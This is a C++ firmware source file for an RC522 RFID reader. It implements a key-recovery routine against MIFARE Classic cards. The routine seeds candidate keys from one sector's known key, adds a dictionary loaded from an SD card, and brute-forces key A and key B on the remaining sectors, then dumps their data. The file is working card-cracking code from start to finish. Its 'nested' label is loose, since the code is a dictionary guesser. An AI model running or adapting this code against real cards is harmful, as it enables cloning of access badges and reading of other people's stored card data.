#include "attacks/nested_attack.h"
#include "hal/card_comm.h"
#include "core/key_store.h"
#include "output/serial_reporter.h"
#include "config.h"
#include <vector>
#include <stdlib.h>
#include <string.h>

static void _tryKeyNested(CardDump* d, uint8_t sector, const uint8_t* key, bool isA) {
    uint8_t trailer = ks_sectorToTrailer(sector);
    reporter_attackStart("nested", sector, isA?"A":"B");
    RC522Status st = picc_mfAuth(isA?MF_AUTH_KEY_A:MF_AUTH_KEY_B, trailer, key, &d->uid);
    if (st==RC522_OK) {
        uint8_t buf[16];
        if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) {
            if (isA) ks_setKeyA(d, sector, key); else ks_setKeyB(d, sector, key);
            reporter_keyFound(sector, isA?"A":"B", key, "nested-bruteforce");
            reporter_dataRead(sector, ks_sectorToFirstBlock(sector), buf);
        }
        picc_mfDeauth();
    } else {
        reporter_keyFailed(sector, isA?"A":"B");
    }
}

void nestedAttack_run(CardDump* d) {
    // Nested attack: heuristic improved dictionary using any known key as seed
    int8_t known = ks_firstKnownSector(d);
    if (known < 0) {
        reporter_error("NESTED_NO_BASE", "No known key to bootstrap nested attack");
        return;
    }

    uint8_t baseKey[6];
    if (ks_hasKeyA(d, known)) memcpy(baseKey, d->sectors[known].keyA, 6);
    else if (ks_hasKeyB(d, known)) memcpy(baseKey, d->sectors[known].keyB, 6);
    else { reporter_error("NESTED_NO_BASE", "No key bytes available"); return; }

    // Build candidate list by simple derivations of baseKey + SD/builtin
    std::vector<uint8_t*> candidates;
    // builtin: try flipping bytes and common transforms
    for (int i=0;i<6;i++) {
        uint8_t* k = (uint8_t*)malloc(6);
        memcpy(k, baseKey, 6);
        k[i] = ~k[i];
        candidates.push_back(k);
    }
    // xor with 0xFF
    uint8_t* kff = (uint8_t*)malloc(6); for (int i=0;i<6;i++) kff[i]=baseKey[i]^0xFF; candidates.push_back(kff);

    // add SD keys
    if (SD.begin(SD_CS_PIN)) {
        File f = SD.open(DICT_PATH);
        if (f) {
            while (f.available()) {
                String line = f.readStringUntil('\n'); line.trim();
                if (line.length()==12) {
                    uint8_t* kop = (uint8_t*)malloc(6);
                    for (int i=0;i<6;i++) kop[i] = (uint8_t) strtoul(line.substring(i*2, i*2+2).c_str(), NULL, 16);
                    candidates.push_back(kop);
                }
            }
            f.close();
        }
    }

    // Try candidates on unknown sectors
    for (uint8_t s=0; s<d->totalSectors; s++) {
        if (ks_isSectorKnown(d,s)) continue;
        for (auto kptr: candidates) {
            _tryKeyNested(d, s, kptr, true);
            if (ks_isSectorKnown(d,s)) break;
            _tryKeyNested(d, s, kptr, false);
            if (ks_isSectorKnown(d,s)) break;
        }
    }

    // free candidates
    for (auto kptr: candidates) free(kptr);
}
